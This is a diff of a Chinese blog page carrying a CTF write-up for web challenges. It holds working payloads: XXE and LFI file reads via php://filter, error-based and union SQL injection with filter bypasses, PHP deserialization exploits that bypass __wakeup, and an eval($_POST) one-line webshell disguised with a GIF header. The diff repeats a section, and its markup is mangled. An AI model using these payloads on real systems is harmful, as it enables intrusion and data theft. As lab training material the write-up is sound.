@@ -398,71 +398,46 @@
 这道题也类似，在百度了其他同样类型题之后，我有了思路。首先使用BP抓包，然后送入Intruder中然后清除标识，再在payloads选项中设置type为Null payloads，然后下面的数量就输入3000，并把线程调为50，然后开始爆破，这样就可以一直上传空数据包。然后呢，在Repeater中进行go，然后把回应中的上传路径复制到url中进行访问再转发，就得到了flag,也就是成功执行了条件竞争漏洞。
 关于之前截取的代码意思，是讲的这个输入框的处理过程，以及上传路径的一个加密，也就是这样才能实现条件竞争，因为知道了上传的路径才能进行访问。
 &amp;emsp;&amp;emsp;summary:可以看出来，上传文件的路径，应该是保密起来的，要进行加密对其复杂化，最好能分隔不同文件的上传路径，或者是先不保存到服务器中，在中间再进行一次处理检测，再保存，以防上传类的漏洞。</code></pre>
-<?xml version="1.0" encoding="UTF-8" ?>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;!DOCTYPE xxe[
+&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./_f14g_ls_Here_.php&quot;&gt;
+]&gt;
+    &lt;root&gt;
+        &lt;name&gt;&amp;xxe;&lt;/name&gt;
+        &lt;request&gt;flag&lt;/request&gt;
+    &lt;/root&gt;</code></pre><p>这里还有一点需要注意，直接这样页面不会给出想要的回显，但是在SYSTEM这里换行就可以了，这里应该是个什么需要注意的地方，先记下来。这里我回去试过后发现了原因，在把payload粘贴进去时候有些代码过长会自动换行，而这里换行后，默认会多出一个空格，这里就在base64-encode这中间多了个空格导致整个xml语句出错。<br>复现拿到flag.</p>
+<h3><span id="3hardsql">3.hardsql</span></h3><p>&emsp;&emsp;在进行各种尝试后发现union,or,adn等都被过滤掉，这里只能使用报错注入，updatexml,extractvaleue都可以,payload:</p>
+<pre><code>数据库名：
+username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,
+(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1)# 表
+名： username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,
+(select(group_concat(table_name))from(information_schema.tables)where(table_schem
+a)like&#39;geek&#39;),0x7e),1)# 列名：
+username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,
+(select(group_concat(column_name))from(information_schema.columns)where(table_nam
+e)like&#39;H4rDsq1&#39;),0x7e),1)# 字段：
+username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,
+(select(group_concat(password))from(H4rDsq1)),0x7e),1)#</code></pre><h3><span id="5简单的sqlhttp1182514408100">5.简单的sql()</span></h3><p>&emsp;&emsp;首先进入页面后会看到一个登陆框，由于题目是sql注入因而直接开始注入，首先输入用户名：admin,输入密码：or ‘1’=’1<br>首先猜测其检测方式，如果是用户名和密码分开检测，则不好注入，至少我现在还不是很会。在我输入了以上内容后出现：check.php:You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1’=’1’’ at line 1<br>也就是说这是一行，大致猜想判断语句select<br> username and password from DB where username = ‘<strong><strong>‘ and password = ‘</strong></strong>‘ 故继续尝试注入。<br>由于之前误解为了万能密码，后面发现就是简单的没有过滤的sql注入，直接按照常规走，这里注入点在username,直接构造0’ 就会报错。之后获取字段数量，<br><code>0&#39; order by 3</code>页面回显错误，故字段数量为3.<br><code>0&#39; order union select 1,2,database()#</code>获取数据库名<br><code>0&#39; order union select 1,2,table_name from information_schema.tables where database()=&quot;geek&quot;#</code>即可获取表名，当然可以在后面加上limit 1,1 然后修改,前面的数字即可获取更多的表名。<br>获取字段内容类似，其他的payload相似就不一一构造了，拿下flag.</p>
+<h3><span id="6lovesql">6.lovesql</span></h3><p>&emsp;&emsp;这道题和简单的sql一样因为做了很久了，可能wp写混了，简单sql好像直接就出flag了，然后lovesql要把流程都走一遍，上面还有一个很小的用sqlmap是没有灵魂的。我的Py环境一样，同样纯手工，payload为上题一样，也没有过滤些什么，就是表有点多，可以几十几十个表的在limit里面加。</p>
+<h3><span id="7代码审计httpctf1redteamtoday8081">7.代码审计（）</span></h3><p>&emsp;&emsp;进入页面后一大堆不认识的代码，其中有两行关键得代码：$password = “If I knew where I would die, I would never go there.”;<br>    $arr = explode(‘ ‘, $password);<br>因而我得去学习一下explode函数，这个函数是把字符串打散为数组。其中是按照空格来存储的，那么我用本地输出一下它的值。<br>接下来算一下它的长度,count($arr)=12;<br>startsWith($url,”http://“)这个函数是用来比较后面那个字符串在前一个变量中是否存在，存在则返回true.<br>// 创建一个新cURL资源<br>$ch = curl_init();<br>PHP中使用cURL实现Get和Post请求的方法<br>php中==是比较值是否相等，例如’1‘=1，而===不仅要求值相等，还要求类型也相等.在多种实验以及测试后，最终放弃了这道题，联系到了大佬说是SSRF，仔细学习后任然解不出来，，等待大佬的WP吧。。</p>
+<h3><span id="8syc柳暗花明http1182514408108">8.Syc柳暗花明()</span></h3><p>&esmp;&esmp;进入页面后，是一大段Syc的小介绍还给了招新群，CTRL+U看下源代码。发现有个href=Secret.php进入到这个PHP下面，页面提示了不是来自<a href="http://www.Sycsecret.com.抓包到BP中，修改Referer" target="_blank" rel="noopener">www.Sycsecret.com.抓包到BP中，修改Referer</a>: <a href="http://www.Sycsecret.com,提示不是来自Syclover浏览器的.故改User-Agent为这个，之后提示要在本地才能查看，再次添加XFF：" target="_blank" rel="noopener">www.Sycsecret.com,提示不是来自Syclover浏览器的.故改User-Agent为这个，之后提示要在本地才能查看，再次添加XFF：</a> 127.0.0.1.最后拿下flag.</p>
+<h3><span id="9babysql">9.Babysql</span></h3><p>&emsp;&emsp;这道题和简单的sql类似，但是注入点在password,然后过滤了union,table,and这些关键字，过滤掉的关键字可以加**这样就可以正常的显示出来了.<br>payload:0’ or un**ion se**lect 1,2,ta**ble_name from info**rmation_sch**ema.ta**bles wh**ere database()=’greek’#<br>其他的类似，同样后面需要加limit 1,1 我记得好像有159个表，字段也挺多的，很想用sqlmap跑的，但是我得py环境有点异常，老是跑不出来，最后还是手工注入了。拿下flag.其他的payload类似就不一一书写了。</p>
+<h3><span id="10jiangs-secret">10.Jiang’s Secret</span></h3><p>&emsp;&emsp;进入页面后直接查看源代码，发现了一个./Archive_room.php,然后进去后再查看源代码，又发现一个action.php。这么多跳转页面，直接用BP抓包看，最后在action.php转发时，发现了secr3t.php，进去页面后，说flag在flag.php页面，于是访问flag.php页面回显找不到我，，，.然后页面还有一段php代码</p>
+<pre><code>    error_reporting(0);
+    $file=$_GET[&#39;file&#39;];
+    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){
+        echo &quot;Oh no!&quot;;
+        exit();
+    }
+    include($file);```
+从上可以看出来，这个php存在着任意文件的读取，因为把用户可控制的file文件名使用了include包含。因而可以使用payload:
+​```php://filter/read=convert.base64-encode/resource=flag.php```
+获取到的flag.php是base64加密的解码即可拿下flag.
+最后拿下了flag.
 
-<!DOCTYPE xxe[
-<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=./_f14g_ls_Here_.php">
-<p>]&gt;<br>    <root><br>        <name>&xxe;</name><br>        <request>flag</request><br>    </root></p>
-<pre><code>这里还有一点需要注意，直接这样页面不会给出想要的回显，但是在SYSTEM这里换行就可以了，这里应该是个什么需要注意的地方，先记下来。这里我回去试过后发现了原因，在把payload粘贴进去时候有些代码过长会自动换行，而这里换行后，默认会多出一个空格，这里就在base64-encode这中间多了个空格导致整个xml语句出错。
-复现拿到flag.
-### 3.hardsql
-
-&amp;emsp;&amp;emsp;在进行各种尝试后发现union,or,adn等都被过滤掉，这里只能使用报错注入，updatexml,extractvaleue都可以,payload:
-</code></pre><p>数据库名：<br>username=admin&amp;password=admin’^updatexml(1,concat(0x7e,<br>(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1)# 表<br>名： username=admin&amp;password=admin’^updatexml(1,concat(0x7e,<br>(select(group_concat(table_name))from(information_schema.tables)where(table_schem<br>a)like’geek’),0x7e),1)# 列名：<br>username=admin&amp;password=admin’^updatexml(1,concat(0x7e,<br>(select(group_concat(column_name))from(information_schema.columns)where(table_nam<br>e)like’H4rDsq1’),0x7e),1)# 字段：<br>username=admin&amp;password=admin’^updatexml(1,concat(0x7e,<br>(select(group_concat(password))from(H4rDsq1)),0x7e),1)#</p>
-<pre><code>
-### 5.简单的sql([http://118.25.14.40:8100/](http://118.25.14.40:8100/))
-
-&amp;emsp;&amp;emsp;首先进入页面后会看到一个登陆框，由于题目是sql注入因而直接开始注入，首先输入用户名：admin,输入密码：or &#39;1&#39;=&#39;1
-首先猜测其检测方式，如果是用户名和密码分开检测，则不好注入，至少我现在还不是很会。在我输入了以上内容后出现：check.php:You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;1&#39;=&#39;1&#39;&#39; at line 1
-也就是说这是一行，大致猜想判断语句select
- username and password from DB where username = &#39;****&#39; and password = &#39;****&#39; 故继续尝试注入。
-由于之前误解为了万能密码，后面发现就是简单的没有过滤的sql注入，直接按照常规走，这里注入点在username,直接构造0&#39; 就会报错。之后获取字段数量，
-```0&#39; order by 3 ```页面回显错误，故字段数量为3.
-```0&#39; order union select 1,2,database()# ```获取数据库名
-```0&#39; order union select 1,2,table_name from information_schema.tables where database()=&quot;geek&quot;# ```即可获取表名，当然可以在后面加上limit 1,1 然后修改,前面的数字即可获取更多的表名。
-获取字段内容类似，其他的payload相似就不一一构造了，拿下flag.
-
-### 6.lovesql
-
-&amp;emsp;&amp;emsp;这道题和简单的sql一样因为做了很久了，可能wp写混了，简单sql好像直接就出flag了，然后lovesql要把流程都走一遍，上面还有一个很小的用sqlmap是没有灵魂的。我的Py环境一样，同样纯手工，payload为上题一样，也没有过滤些什么，就是表有点多，可以几十几十个表的在limit里面加。
-
-### 7.代码审计（[http://ctf1.redteam.today:8081/](http://ctf1.redteam.today:8081/)）
-
-&amp;emsp;&amp;emsp;进入页面后一大堆不认识的代码，其中有两行关键得代码：$password = &quot;If I knew where I would die, I would never go there.&quot;;
-    $arr = explode(&#39; &#39;, $password);
-因而我得去学习一下explode函数，这个函数是把字符串打散为数组。其中是按照空格来存储的，那么我用本地输出一下它的值。
-接下来算一下它的长度,count($arr)=12;
-startsWith($url,&quot;http://&quot;)这个函数是用来比较后面那个字符串在前一个变量中是否存在，存在则返回true.
-// 创建一个新cURL资源
-$ch = curl_init();
-PHP中使用cURL实现Get和Post请求的方法
-php中==是比较值是否相等，例如’1‘=1，而===不仅要求值相等，还要求类型也相等.在多种实验以及测试后，最终放弃了这道题，联系到了大佬说是SSRF，仔细学习后任然解不出来，，等待大佬的WP吧。。
-
-
-
-### 8.Syc柳暗花明([http://118.25.14.40:8108/](http://118.25.14.40:8108/))
-
-&amp;esmp;&amp;esmp;进入页面后，是一大段Syc的小介绍还给了招新群，CTRL+U看下源代码。发现有个href=Secret.php进入到这个PHP下面，页面提示了不是来自www.Sycsecret.com.抓包到BP中，修改Referer: www.Sycsecret.com,提示不是来自Syclover浏览器的.故改User-Agent为这个，之后提示要在本地才能查看，再次添加XFF： 127.0.0.1.最后拿下flag.
-
-
-
-### 9.Babysql
-
-&amp;emsp;&amp;emsp;这道题和简单的sql类似，但是注入点在password,然后过滤了union,table,and这些关键字，过滤掉的关键字可以加\*\*这样就可以正常的显示出来了.
-payload:0&#39; or un\*\*ion se\*\*lect 1,2,ta\*\*ble_name from info\*\*rmation_sch\*\*ema.ta\*\*bles wh**ere database()=&#39;greek&#39;#
-其他的类似，同样后面需要加limit 1,1 我记得好像有159个表，字段也挺多的，很想用sqlmap跑的，但是我得py环境有点异常，老是跑不出来，最后还是手工注入了。拿下flag.其他的payload类似就不一一书写了。
-
-### 10.Jiang&#39;s Secret
-
-&amp;emsp;&amp;emsp;进入页面后直接查看源代码，发现了一个./Archive_room.php,然后进去后再查看源代码，又发现一个action.php。这么多跳转页面，直接用BP抓包看，最后在action.php转发时，发现了secr3t.php，进去页面后，说flag在flag.php页面，于是访问flag.php页面回显找不到我，，，.然后页面还有一段php代码
-</code></pre><pre><code>error_reporting(0);
-$file=$_GET[&#39;file&#39;];
-if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){
-    echo &quot;Oh no!&quot;;
-    exit();
-}
-include($file);```</code></pre><p>从上可以看出来，这个php存在着任意文件的读取，因为把用户可控制的file文件名使用了include包含。因而可以使用payload:<br>​<code>php://filter/read=convert.base64-encode/resource=flag.php</code><br>获取到的flag.php是base64加密的解码即可拿下flag.<br>最后拿下了flag.</p>
-<p>11.反序列化<br>&emsp;&emsp;进入页面后直接ctrl+U查看源代码。<br>​<code>class Student
+11.反序列化
+&amp;emsp;&amp;emsp;进入页面后直接ctrl+U查看源代码。
+​```class Student
 {
     public $score = 0;
     public function __destruct()
@@ -476,39 +451,64 @@ include($file);```</code></pre><p>从上可以看出来，这个php存在着任�
 }
 $exp = $_GET[&#39;exp&#39;];
 echo &quot;&lt;br&gt;&quot;;
-unserialize($exp);</code><br>代码审计可以知道，直接构造一个Student类的序列化，其中包含$score=10000.就可以拿下flag.<br>​```payload:    class Student<br>{<br>    public $score = 10000;</p>
-<p>}<br> $class1=new Student;<br>    echo serialize($class1);```<br>本地输出反序列化的一串然后exp=这一串就拿到了flag.</p>
-<p>12.又来一只猫<br>&emsp;&emsp;进入页面说有个备份的好习惯，我马上想到了是不是index.php.bak文件，打开没有，因而直接使用御剑扫描一下，发现了一个zip。打开解压后便出现了源码，源码过多就不一一粘贴了。这里只粘贴关键性的几句。<br>​```include ‘flag.php’;</p>
-<p>error_reporting(0);</p>
-<p>class Name{<br>    private $username = ‘nonono’;<br>    private $password = ‘yesyes’;</p>
-<pre><code>public function __construct($username,$password){
-    $this-&gt;username = $username;
-    $this-&gt;password = $password;
-}
+unserialize($exp);```
+代码审计可以知道，直接构造一个Student类的序列化，其中包含$score=10000.就可以拿下flag.
+​```payload:    class Student
+{
+    public $score = 10000;
 
-function __wakeup(){
-    $this-&gt;username = &#39;guest&#39;;
 }
+ $class1=new Student;
+    echo serialize($class1);```
+本地输出反序列化的一串然后exp=这一串就拿到了flag.
 
-function __destruct(){
-    if ($this-&gt;password != 100) {
-        echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
-        echo &quot;You name is: &quot;;
-        echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;You password is: &quot;;
-        echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
-        die();
+12.又来一只猫
+&amp;emsp;&amp;emsp;进入页面说有个备份的好习惯，我马上想到了是不是index.php.bak文件，打开没有，因而直接使用御剑扫描一下，发现了一个zip。打开解压后便出现了源码，源码过多就不一一粘贴了。这里只粘贴关键性的几句。
+​```include &#39;flag.php&#39;;
+
+
+error_reporting(0);
+
+
+class Name{
+    private $username = &#39;nonono&#39;;
+    private $password = &#39;yesyes&#39;;
+
+    public function __construct($username,$password){
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
     }
-    if ($this-&gt;username === &#39;admin&#39;) {
-        global $flag;
-        echo $flag;
-    }else{
-        echo $username;
-        echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
-        die();```</code></pre><p>上面是test.php的内容，下面<br>​<code>include &#39;class.php&#39;;
+
+    function __wakeup(){
+        $this-&gt;username = &#39;guest&#39;;
+    }
+
+    function __destruct(){
+        if ($this-&gt;password != 100) {
+            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
+            echo &quot;You name is: &quot;;
+            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
+            echo &quot;You password is: &quot;;
+            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
+            die();
+        }
+        if ($this-&gt;username === &#39;admin&#39;) {
+            global $flag;
+            echo $flag;
+        }else{
+            echo $username;
+            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
+            die();```
+上面是test.php的内容，下面
+​```include &#39;class.php&#39;;
     $select = $_GET[&#39;select&#39;];
-    $res=unserialize(@$select);</code><br>查看源代码，发现又是一个关于序列化漏洞的题。所谓序列化漏洞是指构造序列化的字符串后会触发魔术方法或者称为魔术函数的自动执行。这可能是程序本身不想看到的结果。其中魔术方法就包括toString(),<strong>construct(),以及</strong>destruct()方法。其中con和de是相反的两个，前面那个是对象建立时会自动调用，后面那个是对象销毁时会自动调用。这里我在构造了与之前的题一样的类的序列化后，发现绕不过，没有满足条件，主要是test.php中定义的变量为私有类，在这里采用同样的方法不行了。在百度了各种资料后，主要搜索关于序列化的漏洞，在这里面发现了几个特别的方法，payload:<code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}</code><br>这里使用直接构造的payload不行，其中Name后面的参数代表构造里面变量的数量，privete的参数被序列化后应当添加\00类名，public的序列化不变，protected的参数需要添加\00*\00类名。在class.php中有个<strong>weakup需要绕过，需要将成员属性修改大于实际数目即可绕过。为什么要绕过</strong>wakeup()方法呢，因为它会在unserialize()时会自动调用这个方法，而题目的index.php就调用了。因而它会最先被调用，那么username就变成了guest。为了构造admin那么必须绕过它。最后拿下flag.</p>
-<p>13.你有初恋吗<br>&emsp;&emsp;页面上面提示了Hash，要Hash出同样的感觉。查看源代码又是一个代码审计题：<br>​<code>$adore=&#39;***************&#39;;
+    $res=unserialize(@$select);```
+查看源代码，发现又是一个关于序列化漏洞的题。所谓序列化漏洞是指构造序列化的字符串后会触发魔术方法或者称为魔术函数的自动执行。这可能是程序本身不想看到的结果。其中魔术方法就包括toString(),__construct(),以及__destruct()方法。其中con和de是相反的两个，前面那个是对象建立时会自动调用，后面那个是对象销毁时会自动调用。这里我在构造了与之前的题一样的类的序列化后，发现绕不过，没有满足条件，主要是test.php中定义的变量为私有类，在这里采用同样的方法不行了。在百度了各种资料后，主要搜索关于序列化的漏洞，在这里面发现了几个特别的方法，payload:```O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}```
+这里使用直接构造的payload不行，其中Name后面的参数代表构造里面变量的数量，privete的参数被序列化后应当添加\00类名，public的序列化不变，protected的参数需要添加\00*\00类名。在class.php中有个__weakup需要绕过，需要将成员属性修改大于实际数目即可绕过。为什么要绕过__wakeup()方法呢，因为它会在unserialize()时会自动调用这个方法，而题目的index.php就调用了。因而它会最先被调用，那么username就变成了guest。为了构造admin那么必须绕过它。最后拿下flag.
+
+13.你有初恋吗
+&amp;emsp;&amp;emsp;页面上面提示了Hash，要Hash出同样的感觉。查看源代码又是一个代码审计题：
+​```$adore=&#39;***************&#39;;
 $now = $_POST[&#39;lover&#39;];
 setcookie(&quot;Heart&quot;, md5($adore.&#39;syclover&#39;));
 if(isset($now)&amp;&amp;$now!=syclover) {
@@ -517,23 +517,36 @@ if(isset($now)&amp;&amp;$now!=syclover) {
         }else {
             die(&#39;I do not love you! You are not in my heart!&#39;);
             }
-    }</code><br>可以看到，绕过很简单，由于会自动urldecode一次，故将syclover两次urldecode就可以了。最后post提交拿下flag</p>
-<p>以下下均为自己没有做出来的题，然后看了答案复现一波</p>
-<p>1.你有特洛伊木马吗<br>&emsp;&emsp;这道题其实很清楚了就是上传一个一句话木马就可以拿到flag,奈何我之前怎么搞都上传不了。忘记了一个判断一句话木马的几个过滤条件：<br>一般会检测文件名后缀，以及检测PHP起始符(<?),检测content-type的文件类型，并且检测文件头是否是图片的文件头。
+    }```
+可以看到，绕过很简单，由于会自动urldecode一次，故将syclover两次urldecode就可以了。最后post提交拿下flag
+
+以下下均为自己没有做出来的题，然后看了答案复现一波
+
+1.你有特洛伊木马吗
+&amp;emsp;&amp;emsp;这道题其实很清楚了就是上传一个一句话木马就可以拿到flag,奈何我之前怎么搞都上传不了。忘记了一个判断一句话木马的几个过滤条件：
+一般会检测文件名后缀，以及检测PHP起始符(&lt;?),检测content-type的文件类型，并且检测文件头是否是图片的文件头。
 知道了这四个要求起始就比较容易了，文件内容为：
 ​```GIF89a
-<?php @eval($_POST['cl4y']);?>```<br>文件后缀采用.phtml现在去试试能否获得flag.<br>按理是可以获得flag的可能是由于环境问题导致没有得到flag,继续下一题复现。</p>
-<p>2.性感黄阿姨，在线聊天 –笑<br>&emsp;&emsp;发送flag过去，提示：我很想告诉你的，可惜你只是我的guest<br>抓包后可以看到name的value是guest,改为admin后，提示：<br>​<code>{&quot;response&quot;:&quot;Congratulations! flag in ./_f14g_Is_Here_.php ,try ro read it!&quot;}</code><br>这里可以直接用弱类型绕过，因为是双等号，直接用Intruder进行爆破，可以得到当name为357时候会提示flag in ./<em>f14g_ls_Here</em>.php<br>然后让我们尝试去读它，在请求数据包中可以看到数据传送方式是json，那么可以猜测xml后端可能也可以解析，修改Content-Type为xml，然后编写一段简单的xml代码：<br>​<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;?php @eval($_POST[&#39;cl4y&#39;]);?&gt;```
+文件后缀采用.phtml现在去试试能否获得flag.
+按理是可以获得flag的可能是由于环境问题导致没有得到flag,继续下一题复现。
+
+2.性感黄阿姨，在线聊天 --笑
+&amp;emsp;&amp;emsp;发送flag过去，提示：我很想告诉你的，可惜你只是我的guest
+抓包后可以看到name的value是guest,改为admin后，提示：
+​```{&quot;response&quot;:&quot;Congratulations! flag in ./_f14g_Is_Here_.php ,try ro read it!&quot;}```
+这里可以直接用弱类型绕过，因为是双等号，直接用Intruder进行爆破，可以得到当name为357时候会提示flag in ./_f14g_ls_Here_.php
+然后让我们尝试去读它，在请求数据包中可以看到数据传送方式是json，那么可以猜测xml后端可能也可以解析，修改Content-Type为xml，然后编写一段简单的xml代码：
+​```&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
     &lt;root&gt;
         &lt;name&gt;357&lt;/name&gt;
         &lt;request&gt;flag&lt;/request&gt;
-    &lt;root/&gt;</code><br>在response中回显了可惜你只是我的357说明编写的xml也被直接执行了。<br>这里还可发现回显的地方就是name，因而下面在构造xml语句的时候，利用name的值来做相关操作。<br>接下来构造协议流语句读取php文件了，直接读取不出来./<em>f14g_ls_Here</em>.php.这里还有个考点，php文件中有特殊字符(如&lt;)让xml解析时出错了，需要借助php流读取，<br>payload如下：</p>
-<pre><code>
-13.你有初恋吗
-&amp;emsp;&amp;emsp;页面上面提示了Hash，要Hash出同样的感觉。查看源代码又是一个代码审计题：
-
-```php
-$now = $_POST[&#39;lover&#39;];
+    &lt;root/&gt;```
+在response中回显了可惜你只是我的357说明编写的xml也被直接执行了。
+这里还可发现回显的地方就是name，因而下面在构造xml语句的时候，利用name的值来做相关操作。
+接下来构造协议流语句读取php文件了，直接读取不出来./_f14g_ls_Here_.php.这里还有个考点，php文件中有特殊字符(如&lt;)让xml解析时出错了，需要借助php流读取，
+payload如下：</code></pre><p>13.你有初恋吗<br>&emsp;&emsp;页面上面提示了Hash，要Hash出同样的感觉。查看源代码又是一个代码审计题：</p>
+<pre><code class="php">$now = $_POST[&#39;lover&#39;];
 setcookie(&quot;Heart&quot;, md5($adore.&#39;syclover&#39;));
 if(isset($now)&amp;&amp;$now!=syclover) {
     if($_COOKIE[&#39;Heart&#39;] === md5($adore. urldecode($now))){
@@ -541,7 +554,8 @@ if(isset($now)&amp;&amp;$now!=syclover) {
         }else {
             die(&#39;I do not love you! You are not in my heart!&#39;);
             }
-    }```</code></pre><p>可以看到，绕过很简单，由于会自动urldecode一次，故将syclover两次urldecode就可以了。最后post提交拿下flag</p>
+    }```</code></pre>
+<p>可以看到，绕过很简单，由于会自动urldecode一次，故将syclover两次urldecode就可以了。最后post提交拿下flag</p>
 
         </div>
         <!-- .entry-content -->
